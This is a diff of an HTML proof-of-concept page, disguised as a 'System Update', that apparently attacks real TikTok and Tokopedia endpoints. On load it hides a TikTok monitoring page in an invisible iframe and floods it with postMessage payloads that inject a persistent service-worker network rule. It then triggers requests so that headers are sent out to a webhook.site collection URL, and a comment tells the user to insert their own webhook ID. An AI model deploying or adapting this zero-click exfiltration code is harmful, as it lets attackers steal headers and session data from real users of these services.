@@ -1,19 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Updating...</title></head>
-<body>
-    <h1>[ STATUS: INITIALIZING ]</h1>
-    <iframe id="pwn_gate" src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" style="display:none;"></iframe>
+<head>
+    <title>System Update - Verification</title>
+</head>
+<body style="background: #000; color: #0f0; font-family: monospace; text-align: center;">
+    <h1>[ STATUS: INITIALIZING POC ]</h1>
+    <p>Targeting: mon.tiktokv.com & shop-id.tokopedia.com</p>
+
+    <iframe id="pwn_gate" 
+            src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
+            style="display:none;"></iframe>
 
     <script>
         const gate = document.getElementById('pwn_gate');
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // GANTI DENGAN ID LU
 
         const payload = {
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "persistent_exfil",
+                ruleName: "persistent_zero_click_final",
                 global: true,
                 conditions: [],
                 handlers: [{
@@ -25,33 +31,37 @@
             }]
         };
 
-        gate.onload = function() {
-            console.log("Gate opened. Starting injection...");
+        function startInjection() {
+            console.log("Gate is open. Firing injection sequence...");
             
-            // Mengirim payload berkali-kali untuk menjamin eksekusi di Service Worker
+            // Spam postMessage selama 5 detik untuk memastikan SW menangkapnya
             let count = 0;
             const bomb = setInterval(() => {
-                gate.contentWindow.postMessage(payload, "*");
+                try {
+                    gate.contentWindow.postMessage(payload, "*");
+                } catch(e) {}
                 count++;
-                if (count > 20) {
+                if (count > 30) {
                     clearInterval(bomb);
                     console.log("Injection sequence complete.");
-                    triggerFetch();
+                    triggerNetworkEvent();
                 }
-            }, 300);
-        };
-
-        function triggerFetch() {
-            console.log("Triggering network rule...");
-            // Memicu fetch ke domain yang sama agar SW mengirim header ke webhook
-            fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { mode: 'no-cors' });
-            
-            // Tambahan: Trigger ke Tokopedia juga karena scope SW-nya luas
-            const img = new Image();
-            img.src = "https://shop-id.tokopedia.com/favicon.ico?nocache=" + Date.now();
+            }, 200);
         }
+
+        function triggerNetworkEvent() {
+            console.log("Triggering fetch to verify injection...");
+            
+            // Trigger 1: Endpoint monitor (200 OK)
+            fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { mode: 'no-cors' });
+
+            // Trigger 2: Endpoint Tokopedia (Meski 404, header tetap akan terinjeksi)
+            const img = new Image();
+            img.src = "https://shop-id.tokopedia.com/favicon.ico?v=" + Date.now();
+        }
+
+        // Jalankan otomatis saat Iframe load
+        gate.onload = startInjection;
     </script>
-</body>
-</html>
 </body>
 </html>
